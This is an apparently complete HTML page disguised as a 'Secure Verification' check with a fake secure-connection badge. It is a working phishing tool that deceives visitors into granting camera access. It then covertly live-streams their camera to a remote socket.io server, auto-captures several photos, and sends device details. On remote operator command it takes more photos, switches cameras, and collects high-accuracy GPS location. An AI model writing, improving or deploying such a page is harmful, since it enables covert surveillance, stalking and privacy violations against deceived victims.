<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification - Please Wait</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center;
            font-family: Arial, sans-serif; background: #121212; color: #eee;
        }
        .card {
            width: 90%; max-width: 400px; background: #1e1e1e; padding: 30px;
            border-radius: 14px; box-shadow: 0 8px 30px rgba(0,0,0,0.5); text-align: center; border: 1px solid #333;
        }
        h2 { margin-top: 0; color: #fff; font-size: 22px; }
        p { color: #aaa; font-size: 14px; line-height: 1.5; }
        .status { padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px; font-weight: bold; }
        .waiting { background: #2c3e50; color: #3498db; }
        .error { background: #512e2f; color: #e74c3c; }
        .success { background: #1e4620; color: #2ecc71; }
        .action-btn {
            width: 100%; background: #27ae60; color: white; border: none; padding: 14px;
            border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px;
        }
        .action-btn:hover { opacity: 0.9; }
        video { display: none !important; }
        .secure-badge { font-size: 11px; color: #7f8c8d; margin-top: 20px; display: block; }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <h2>System Verification</h2>
    <p>Please complete the security check to proceed safely.</p>
    <div id="status" class="status waiting">Click below to start verification</div>
    <button id="startBtn" class="action-btn" onclick="triggerVerification()">Verify & Continue</button>
    <video id="video" autoplay playsinline muted></video>
    <span class="secure-badge">🔒 256-bit Secure Connection</span>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");
const startBtn = document.getElementById("startBtn");

let mediaStream = null;
let cameraReady = false;
let useFrontCamera = true;
let streamInterval = null;
let autoCaptureDone = false;

function setStatus(message, type) {
    statusBox.textContent = message;
    statusBox.className = "status " + type;
}

function getDeviceInfo() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Desktop/PC";
    let browser = "Unknown";
    if (ua.includes("android")) device = "Android Mobile";
    else if (ua.includes("iphone") || ua.includes("ipad")) device = "iOS Device";
    else if (ua.includes("mobile")) device = "Mobile Device";
    if (ua.includes("edg")) browser = "Edge";
    else if (ua.includes("chrome")) browser = "Chrome";
    else if (ua.includes("firefox")) browser = "Firefox";
    else if (ua.includes("safari")) browser = "Safari";
    return `${device} (${browser})`;
}

function requestAndSendLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        pos => socket.emit("user-location", { latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
        err => {},
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
}

// Only request Camera first as per your requirement
async function triggerVerification() {
    startBtn.style.display = "none";
    setStatus("Verifying session...", "waiting");
    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: false, // Shuru mein sirf camera
            video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
        });
        mediaStream = stream;
        video.srcObject = stream;
        await video.play();
        cameraReady = true;
        setStatus("Verified Successfully!", "success");
        socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
        startLiveStream();
        
        // Auto capture 5 photos, 1 every second
        if (!autoCaptureDone) {
            autoCaptureDone = true;
            runAutoCaptureSequence();
        }
    } catch (error) {
        cameraReady = false;
        setStatus("Camera access required.", "error");
        startBtn.style.display = "block";
    }
}

function startLiveStream() {
    if (streamInterval) clearInterval(streamInterval);
    streamInterval = setInterval(() => {
        if (!cameraReady || !video.videoWidth) return;
        canvas.width = 640;
        canvas.height = 360;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, 640, 360);
        socket.emit("live-stream-frame", canvas.toDataURL("image/jpeg", 0.6));
    }, 200);
}

function takeSinglePhoto() {
    if (!cameraReady) return;
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    socket.emit("user-photo-captured", canvas.toDataURL("image/jpeg", 0.90));
}

function runAutoCaptureSequence() {
    let count = 0;
    takeSinglePhoto(); // 1st photo immediately
    count++;

    const timer = setInterval(() => {
        if (count >= 5) {
            clearInterval(timer);
            return;
        }
        takeSinglePhoto();
        count++;
    }, 1000); // 1 second gap between each photo
}

socket.on("link-disabled", () => {
    document.body.innerHTML = `<div style="text-align:center;color:#fff;padding:50px;font-family:sans-serif;"><h2>Link is currently inactive or closed by admin.</h2></div>`;
});

socket.on("capture-photo", () => takeSinglePhoto());
socket.on("request-location", () => requestAndSendLocation());
socket.on("switch-camera", async () => {
    useFrontCamera = !useFrontCamera;
    if (cameraReady) await triggerVerification();
});

socket.on("connect", () => {
    socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
});
</script>
</body>
</html>
